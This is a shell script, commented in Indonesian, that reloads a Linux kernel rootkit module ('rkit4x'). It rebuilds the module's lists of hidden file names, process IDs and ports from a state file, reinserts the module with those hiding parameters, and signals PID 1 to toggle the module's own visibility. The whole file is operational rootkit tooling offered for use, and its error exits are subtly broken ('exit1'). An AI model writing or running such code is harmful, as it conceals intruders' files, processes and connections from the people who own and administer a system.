#!/bin/sh
# rkit-reload.sh — LEGACY ONLY: reload modul dengan SELURUH daftar dari state.
#
# Kenapa ada: reload (rmmod + insmod) menghapus SEMUA daftar hide —
# mudah lupa menulis ulang entri lama (PID/folder "muncul lagi").
# Kini state = sumber kebenaran; terapkan =1 perintah.
#
# Pakai:
#   tambah entri   : echo name rahasia.txt >> /var/lib/rkit/state
#                    echo pid 12345        >> /var/lib/rkit/state
#                    echo port 8080        >> /var/lib/rkit/state
#   hapus entri    : sed -i '/^pid 12345$/d' /var/lib/rkit/state
#   terapkan       : sh /rootkit/tools/rkit-reload.sh
#   cek            : lsmod | grep rkit4x ; dmesg | grep l4x | tail -3
#
# Catatan: pid TIDAK dipulihkan saat boot (PID berubah tiap reboot) —
# hanya berlaku saat reload runtime.

STATE=/var/lib/rkit/state
ROOT=$(cd "$(dirname "$0")/.." && pwd)
KO="$ROOT/backend/legacy_4x/kernel/rkit4x.ko"

if [ ! -f "$KO" ]; then
	echo "rkit-reload: $KO tidak ada — script ini khusus backend LEGACY" >&2
	exit1
fi

NAMES=""; PIDS=""; PORTS=""
if [ -f "$STATE" ]; then
	while read -r kind val _rest; do
		case "$kind" in
		name) NAMES="${NAMES:+$NAMES,}$val" ;;
		pid)  PIDS="${PIDS:+$PIDS,}$val" ;;
		port) PORTS="${PORTS:+$PORTS,}$val" ;;
		esac
	done < "$STATE"
fi

# pastikan modul tampil dulu (bila sedang tersembunyi via kill -s 64)
kill -s 62 1 2>/dev/null || true

if ! rmmod rkit4x 2>/dev/null; then
	echo "rkit-reload: rmmod gagal — modul tidak termuat?" >&2
	exit1
fi

ARGS=""
[ -n "$NAMES" ] && ARGS="$ARGS hide=$NAMES"
[ -n "$PIDS" ] && ARGS="$ARGS hidepid=$PIDS"
[ -n "$PORTS" ] && ARGS="$ARGS hideport=$PORTS"

# ARGS dipisah spasi disengaja (nilai sudah diformat sendiri, tanpa spasi)
# shellcheck disable=SC2086
if insmod $KO $ARGS; then
	echo "rkit-reload: OK"
	echo "  name = ${NAMES:-—}"
	echo "  pid  = ${PIDS:-—}"
	echo "  port = ${PORTS:-—}"
else
	echo "rkit-reload: insmod GAGAL" >&2
	exit1
fi
